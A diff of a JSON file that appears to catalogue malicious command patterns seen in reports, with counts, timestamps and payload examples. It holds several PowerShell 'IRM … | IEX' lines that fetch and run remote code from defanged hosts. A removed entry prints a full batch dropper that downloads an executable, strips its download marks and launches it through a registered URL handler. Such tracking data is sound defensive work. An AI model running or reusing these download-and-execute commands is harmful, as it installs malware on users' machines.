@@ -381,10 +381,10 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 11,
-    "ReportCount": 43,
+    "DistinctPayloadCount": 12,
+    "ReportCount": 44,
     "FirstSeen": "2026-11-18T23:56:35.729000+00:00",
-    "LastSeen": "2026-11-25T16:18:49.464000+00:00",
+    "LastSeen": "2026-11-25T18:55:18.748000+00:00",
     "ReportIds": [
       "cmwms5p8k1uev0omlqz8p9obh",
       "cmwn90gcc1vsl0oml5gkbhzu1",
@@ -428,7 +428,8 @@
       "cmwvkqpwc0f2d0nmlhlwvocin",
       "cmwvxf3vm0g3x0nmlspmepj55",
       "cmwwbv3ha0j820nml8gy9rxse",
-      "cmwwbvyrq0j8s0nml0zzkgyv1"
+      "cmwwbvyrq0j8s0nml0zzkgyv1",
+      "cmwwhh7lk0jqc0nmleauzucm1"
     ],
     "PayloadExamples": [
       "IRM fozeenyqzeokeeqh[.]sisterleveling[.]com/4d9a40aa-2dcd-4623-8ab8-8b7ec2355fcb/b5e589ce-d56d-4c50-bc8d-502a073548.36 | IEX",
@@ -441,6 +442,7 @@
       "IRM gitlab[.]com/joon1286/1fdbd074-392d-4285-b67e-ff498ddcb29e/-/raw/main/b04f13f7-5981-4267-afc4-1e6152d7b677 | IEX",
       "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
       "IRM gitlab[.]com/nova-84e1-18b2b/abba73a-484e-4a80-bc53-401c1e95160d/-/raw/main/ac9eDc0-d13C-422f-8cfC-9F91441BfAb2 | IEX",
+      "IRM gitlab[.]com/pas-quarenmjn/a1b22db-1028-4ff5-8353-9ef7c7fedbbd/-/raw/main/Ba-761bEc36334D | IEX",
       "IRM xlfsgudhiaokbioa[.]sisterleveling[.]com/1b60ae7b-21f3-4d74-bb56-138bf4f4620b/b5e589ce-d56d-4c50-bc8d-502a073548.36 | IEX"
     ]
   },
@@ -589,19 +591,6 @@
     ],
     "PayloadExamples": [
       "@echo off\r\nif \"%~1\"==\"_h\" goto :work\r\nstart \"\" /min cmd /c call \"%~f0\" _h\r\nexit /b\r\n:work\r\ntimeout /t 1 >nul\r\nset \"d=%APPDATA%\\Microsoft\\Windows\\Themes\"\r\nset \"l=%PUBLIC%\\v.txt\"\r\nmd \"%d%\" 2>nul\r\ncd /d \"%d%\"\r\necho z>>\"%l%\"\r\ndel /q v.txt 2>nul\r\ndel /q vclreg.exe 2>nul\r\ndel /q vclx370.dat 2>nul\r\nif exist vclreg.exe echo lockexe>>\"%l%\"\r\nif exist vclx370.dat echo lockbpl>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclreg.exe https://baseupdate2798[.]com/ue/x/1avyGp5x <nul\r\necho x%errorlevel%>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclx370.dat https://baseupdate2798[.]com/ue/b/1avyGp5x <nul\r\necho b%errorlevel%>>\"%l%\"\r\ndel /q vclreg.exe:Zone.Identifier 2>nul\r\ndel /q vclx370.dat:Zone.Identifier 2>nul\r\nver >nul\r\n>t echo 1avyGp5x baseupdate2798[.]com\r\nif exist vclreg.exe echo exe>>\"%l%\"\r\nif exist vclx370.dat echo bpl>>\"%l%\"\r\nfor %%f in (vclreg.exe vclx370.dat) do echo %%~zf>>\"%l%\"\r\nif exist vclreg.exe if exist vclx370.dat (\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /ve /d \"URL:vclimg\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /v \"URL Protocol\" /d \"\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\\shell\\open\\command\" /f /ve /t REG_SZ /d \"\\\"%d%\\vclreg.exe\\\" -q \\\"%d%\\vclx370.dat\\\"\" >nul\r\necho r%errorlevel%>>\"%l%\"\r\n>\"%TEMP%\\t.url\" echo [InternetShortcut]\r\n>>\"%TEMP%\\t.url\" echo URL=vclimg:x\r\n%SystemRoot%\\explorer.exe \"%TEMP%\\t.url\"\r\n)\r\necho s%errorlevel%>>\"%l%\"\r\ntimeout /t 1 >nul\r\nreg delete \"HKCU\\Software\\Classes\\vclimg\" /f >nul\r\ndel /q \"%TEMP%\\t.url\" 2>nul"
-    ]
-  },
-  {
-    "Pattern": "@echo off\nif \"%~1\"==\"_h\" goto :work\nstart \"\" /min cmd /c call \"%~f0\" _h\nexit /b\n:work\ntimeout /t 1 >nul\nset \"d=%APPDATA%\\Microsoft\\Windows\\Themes\"\nset \"l=%PUBLIC%\\v.txt\"\nmd \"%d%\" 2>nul\ncd /d \"%d%\"\necho z>>\"%l%\"\ndel /q v.txt 2>nul\ndel /q vclreg.exe 2>nul\ndel /q vclx370.dat 2>nul\nif exist vclreg.exe echo lockexe>>\"%l%\"\nif exist vclx370.dat echo lockbpl>>\"%l%\"\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclreg.exe <URL> <nul\necho x%errorlevel%>>\"%l%\"\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclx370.dat <URL> <nul\necho b%errorlevel%>>\"%l%\"\ndel /q vclreg.exe:Zone.Identifier 2>nul\ndel /q vclx370.dat:Zone.Identifier 2>nul\nver >nul\n>t echo o95Vqdue baseupdate2798.com\nif exist vclreg.exe echo exe>>\"%l%\"\nif exist vclx370.dat echo bpl>>\"%l%\"\nfor %%f in (vclreg.exe vclx370.dat) do echo %%~zf>>\"%l%\"\nif exist vclreg.exe if exist vclx370.dat (\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /ve /d \"URL:vclimg\" >nul\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /v \"URL Protocol\" /d \"\" >nul\nreg add \"HKCU\\Software\\Classes\\vclimg\\shell\\open\\command\" /f /ve /t REG_SZ /d \"\\\"%d%\\vclreg.exe\\\" -q \\\"%d%\\vclx370.dat\\\"\" >nul\necho r%errorlevel%>>\"%l%\"\n>\"%TEMP%\\t.url\" echo [InternetShortcut]\n>>\"%TEMP%\\t.url\" echo URL=vclimg:x\n%SystemRoot%\\explorer.exe \"%TEMP%\\t.url\"\n)\necho s%errorlevel%>>\"%l%\"\ntimeout /t 1 >nul\nreg delete \"HKCU\\Software\\Classes\\vclimg\" /f >nul\ndel /q \"%TEMP%\\t.url\" 2>nul",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-18T18:37:42.970000+00:00",
-    "LastSeen": "2026-11-18T18:37:42.970000+00:00",
-    "ReportIds": [
-      "cmwmgrmb21tcg0omlh195aeoe"
-    ],
-    "PayloadExamples": [
-      "@echo off\r\nif \"%~1\"==\"_h\" goto :work\r\nstart \"\" /min cmd /c call \"%~f0\" _h\r\nexit /b\r\n:work\r\ntimeout /t 1 >nul\r\nset \"d=%APPDATA%\\Microsoft\\Windows\\Themes\"\r\nset \"l=%PUBLIC%\\v.txt\"\r\nmd \"%d%\" 2>nul\r\ncd /d \"%d%\"\r\necho z>>\"%l%\"\r\ndel /q v.txt 2>nul\r\ndel /q vclreg.exe 2>nul\r\ndel /q vclx370.dat 2>nul\r\nif exist vclreg.exe echo lockexe>>\"%l%\"\r\nif exist vclx370.dat echo lockbpl>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclreg.exe https://baseupdate2798[.]com/ue/x/o95Vqdue <nul\r\necho x%errorlevel%>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclx370.dat https://baseupdate2798[.]com/ue/b/o95Vqdue <nul\r\necho b%errorlevel%>>\"%l%\"\r\ndel /q vclreg.exe:Zone.Identifier 2>nul\r\ndel /q vclx370.dat:Zone.Identifier 2>nul\r\nver >nul\r\n>t echo o95Vqdue baseupdate2798[.]com\r\nif exist vclreg.exe echo exe>>\"%l%\"\r\nif exist vclx370.dat echo bpl>>\"%l%\"\r\nfor %%f in (vclreg.exe vclx370.dat) do echo %%~zf>>\"%l%\"\r\nif exist vclreg.exe if exist vclx370.dat (\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /ve /d \"URL:vclimg\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /v \"URL Protocol\" /d \"\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\\shell\\open\\command\" /f /ve /t REG_SZ /d \"\\\"%d%\\vclreg.exe\\\" -q \\\"%d%\\vclx370.dat\\\"\" >nul\r\necho r%errorlevel%>>\"%l%\"\r\n>\"%TEMP%\\t.url\" echo [InternetShortcut]\r\n>>\"%TEMP%\\t.url\" echo URL=vclimg:x\r\n%SystemRoot%\\explorer.exe \"%TEMP%\\t.url\"\r\n)\r\necho s%errorlevel%>>\"%l%\"\r\ntimeout /t 1 >nul\r\nreg delete \"HKCU\\Software\\Classes\\vclimg\" /f >nul\r\ndel /q \"%TEMP%\\t.url\" 2>nul"
     ]
   },
   {
